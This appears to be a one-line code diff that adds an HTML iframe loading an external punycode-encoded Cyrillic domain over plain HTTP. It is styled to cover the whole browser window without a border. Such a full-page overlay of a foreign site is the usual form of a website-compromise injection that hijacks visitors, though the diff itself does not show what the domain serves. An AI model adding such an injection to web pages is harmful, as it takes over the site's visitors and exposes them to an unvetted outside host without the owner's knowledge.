@@ -1,0 +1,1 @@
+<iframe src="http://xn--80aahjj1e.xn--e1asq.xn--p1ai/" style="position:absolute;left:0px;top:0px;right:0px;bottom:0px;display:block;border:none; width:100%; height:100%;"></iframe>
